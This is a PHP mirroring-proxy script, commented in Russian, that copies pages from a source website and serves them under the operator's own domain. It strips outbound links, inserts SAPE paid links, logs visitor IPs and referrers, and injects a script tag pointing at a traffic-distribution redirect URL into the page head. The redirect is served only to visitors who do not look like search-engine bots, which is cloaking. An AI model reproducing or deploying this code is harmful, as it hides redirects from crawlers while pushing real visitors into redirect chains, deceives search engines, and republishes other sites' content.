<?php
include(dirname(__file__).'/config.php');

define('SDS_BLOCKED', 1);
define('SDS_DANGER', 2);
define('SDS_SUSPIC', 4);
define('SDS_OTHER', 8);

if ($config['sape']) {
  define('_SAPE_USER',$config['sape_key'] );
  include(dirname(__file__).'/sape/sape.php');
  $sape = new SAPE_client();
}



include(dirname(__file__).'/function.php');


if ( !$config['debug'] ) error_reporting(0);

## REFERER BEGIN
if ( isset($_SERVER['HTTP_REFERER']) ) {
	$host_ref = parse_url(strval($_SERVER['HTTP_REFERER']));
	$host_ref = strtolower(str_replace('www.', '', $host_ref['host']));
	$host_site = strtolower(str_replace('www.', '', $_SERVER['HTTP_HOST']));
	if ( $host_ref != $host_site and !empty($host_ref) ) {
		SetCookie('ref', strval($_SERVER['HTTP_REFERER']),time() + 2592000);
		$_SERVER['MOD_REFERER'] = strval($_SERVER['HTTP_REFERER']);
	}

} elseif ( isset($_COOKIE['ref']) ) {
	$_SERVER['MOD_REFERER'] = strval($_COOKIE['ref']);

}
## REFERER END

$block = block();
$danger = danger();
$suspic = suspicious();

if ($config['save_data'] == TRUE) {
  if (get_mimetype(basename($_SERVER['REQUEST_URI'])) == 'text/html' && (($block && is_bitflag_set((int)$config['save_data_source'], SDS_BLOCKED)) ||
     ($danger && is_bitflag_set((int)$config['save_data_source'], SDS_DANGER)) ||
     ($suspic && is_bitflag_set((int)$config['save_data_source'], SDS_SUSPIC)) ||
     (is_bitflag_set((int)$config['save_data_source'], SDS_OTHER)))) {
    $data = time().";{$_SERVER['REMOTE_ADDR']};{$_SERVER['MOD_REFERER']};{$_SERVER['REQUEST_URI']};{$_SERVER['HTTP_REFERER']}\r\n";
    $f = fopen(dirname(__FILE__) . '/save_data.txt', 'a+');
    flock($f, LOCK_EX);
    fwrite($f, $data);
    flock($f, LOCK_UN);
    fclose($f);
  }
}



$site_post = $_POST;
$site_get = preg_replace('#^/*#Ui', null, $_SERVER['REQUEST_URI']);

if (preg_match('#'.$config['mydir'].'#Ui', $site_get) and !empty($config['mydir'])) {
  // Если надо открыть файл.
  $url = str_replace($config['mydir'], 'datafiles', $site_get);
  $file = @file_get_contents(dirname(__file__).'/'.$url);
  if (!$file) error404(); else {
    header('Content-type: '.get_mimetype($url));
    echo $file;
  }
} else {
  // Если надо загрузить страницу
  if (empty($site_post) and ext_cache($config['site'].'/'.$site_get)) {
    $load = load_cache($config['site'].'/'.$site_get);
    for ($i=0;$i<count($load['headers']);$i++) header($load['headers'][$i]);
  } else {
    $load = load_pages($config['site'].'/'.$site_get, $site_post);
    header('Content-type: '.$load['type']);
    if (empty($post) && $config['cache']) save_cache($config['site'].'/'.$site_get, $load['code'], 'Content-type: '.$load['type']);
  }
  
  ## Сапоссылки
  if ($config['sape']) {
    $return_links = $sape->return_links();
    if ($config['charset'] && $config['to_charset'] && $config['charset'] !== $config['to_charset'] && !preg_match('#1251#Uis',$config['to_charset'])) {
      $return_links = mb_convert_encoding($return_links, $config['to_charset'], 'cp1251');
    }
    $load['code'] = str_replace('{%sape_links%}', $return_links, $load['code']);
  }
  echo $load['code'];
}



function load_pages($url, $post = false) {
  global $config;
  if (!$url) return false;
  while ((!$code or $go_status === true) and $l <= 5) {
    unset($go_status); // чистим статус, чтобы не было бесконечного цикла :)
    $headers = array (
'Host: '.(preg_replace('#^/|^http://|(/.+)$|/$#Ui',null,$url)),
'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3)',
'Referer: '.$url,
'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
'Keep-Alive: 115',
'Connection: keep-alive',
);
    //print_r($headers);
    $data = curl_init('http://'.$url);
  	//curl_setopt($data, CURLOPT_FOLLOWLOCATION, 1);
  	curl_setopt($data, CURLOPT_RETURNTRANSFER, 1);
  	curl_setopt($data, CURLOPT_HEADER, 1);
  	curl_setopt($data, CURLOPT_HTTPHEADER, $headers);

  	if (!empty($post)) {
      curl_setopt($data, CURLOPT_POST, '1');
      curl_setopt($data, CURLOPT_POSTFIELDS, $post);
  	}
  	if ($config['on_cookie'] == TRUE) {
  	$cookie_file = dirname(__FILE__).'/cache/cookie';
      curl_setopt($data, CURLOPT_COOKIEJAR, $cookie_file);
      curl_setopt($data, CURLOPT_COOKIEFILE, $cookie_file);
  	}
  	
    $code = curl_exec($data);
    $type = @curl_getinfo($data);
  	curl_close($data);

  	preg_match('#^[HTTP]?(.+)\r\n\r\n#Uis', $code, $headers_parse);
  	preg_match('#\nLocation: (.*)\s#Uis', $headers_parse[0], $go_url);
  	
  	if (!empty($go_url[1])) {
      $go_status = true;
      $url = preg_replace('#^http://#Uis', null, $go_url[1]);
    }
  	$l++;
  }
  for ($i=0;$i<=$l;$i++) $code = preg_replace('#^(HTTP(.*)\r\n\r\n)+#Uis', null, $code);
  if (is_watermark($url)) {
    $extension = strtolower(array_pop(explode('.', $url)));
    $code = watermark($code, $extension);
    return array('code'=>$code, 'type'=>$type['content_type']);
  }
   ##проверяем не бот ли по юзерагенту и хостнейму
  if (!empty($_SERVER['HTTP_USER_AGENT']) && !preg_match('#google|spider|bing|bot|yahoo|aol|yandex|crawl|ask|hrefs#i', $_SERVER['HTTP_USER_AGENT'])) {
  if (!preg_match('#google|msn|bing|ask|yahoo|aol|yandex|spider|crawl|hrefs#i', $host )) {
   $isnotbot=1;
  }
 }
  ###### Вставляем кастомный код ######
  if ($config['analytics'] && trim($config['analytics_code']) != '') {
	  if ($isnotbot==1) {
    if ($config['analytics_place'] == 'head') $code = preg_replace('#(</head>)#Usi', "\r\n".$config['analytics_code']."\r\n".'\\1', $code);
    if ($config['analytics_place'] == 'body') $code = preg_replace('#(<body[^>]*>)#Usi', '\\1'."\r\n".$config['analytics_code']."\r\n", $code);
  }
  }
  
  ##вставка ссылки на тдс
  if ($config['redirect'] == 'all'){
  if ($isnotbot==1) {
   $reed1='<script src="http://';
	$reed2='"></script>';
	$code = preg_replace('#(</head>)#Usi', "\r\n".$reed1.$config['redirect_url'].$reed2."\r\n".'\\1', $code);
 }
  } 
  ###### Удаляем внешние ссылки ######
  if ($config['del_links']) {
    preg_match_all('#<a.+href=["|\'](.*)["|\'].+</a>#Uis',$code,$delete);
    for ($m='0';$m<count($delete['1']);$m++) {
      if (preg_match('#http://#Ui', $delete['1'][$m]) && !preg_match('#'.$config['site'].'#Uis', $delete['1'][$m])) {
        $code = str_replace($delete['0'][$m],null,$code);
      }
    }
  }
  ##вставляем код аналитики из файла counter.txt
$counter=file_get_contents('counter.txt');
$code = preg_replace('#(</head>)#Usi', "\r\n".$counter."\r\n".'\\1', $code);
  ###### Удаляем комментарии ######
  if ($config['del_comm']) {
    $code = preg_replace('#<!--(.*)-->#Uis',null,$code);
  }
  
  ###### Перекодируем в нужную кодировку ######
  if ($config['charset'] && $config['to_charset'] && $config['charset'] !== $config['to_charset']) {
    $code = str_replace($config['charset'], $config['to_charset'], $code);
    $type['content_type'] = preg_replace('#'.$config['charset'].'#Uis', $config['to_charset'], $type['content_type']);
    $code = mb_convert_encoding($code, $config['to_charset'], $config['charset']);
  }
  
  //echo $config['site'];
  //echo $config['my_domain'];

  $code = preg_replace('#(http\:\/\/www\.|http\:\/\/)'.$config['site'].'#Uis', 'http://'.$config['my_domain'], $code);
  //$code = preg_replace('#http\:\/\/[a-z0-9]*.', 'http://', $code);
  //print_r($code);
  $replace_file = file_get_contents(dirname( __FILE__ ).'/replace.txt');
  $replace_file = str_replace('{site}', $config['site'], $replace_file);
  $replace_file = str_replace('{my_domain}', $config['my_domain'], $replace_file);
  if ($replace_file) {
    preg_match_all('#<replace>(.*)</replace>#Uis', $replace_file, $replace_data);
    for ($i='0';$i<count($replace_data['1']);$i++) {
      $explode = explode('<|||>', $replace_data['1'][$i]);
      if ($explode[2] == 'REG_ON') {
        $explode[0] = str_replace('#', '\#', $explode[0]);
        /*
        if ( preg_match('#<<<!TRANSLATE_(.*)_(.*)!>>>#Ui',$explode[1],$translate) ) {
          preg_match('#'.$explode[0].'#Uis',$code,$preg);
          $translate_text = translate($preg[1],$translate[1],$translate[2]);
          if (!empty($translate_text)) $explode[0] = $preg[1]; $explode[1] = $translate_text;
        }
        */
        $code = preg_replace('#'.$explode[0].'#Uis', $explode[1], $code);
      } else {
        $code = str_replace($explode[0], $explode[1], $code);
      }
    }
    //$code = translate($code,'RU','EN');
  }
  return array('code'=>$code, 'type'=>$type['content_type']);
}

?>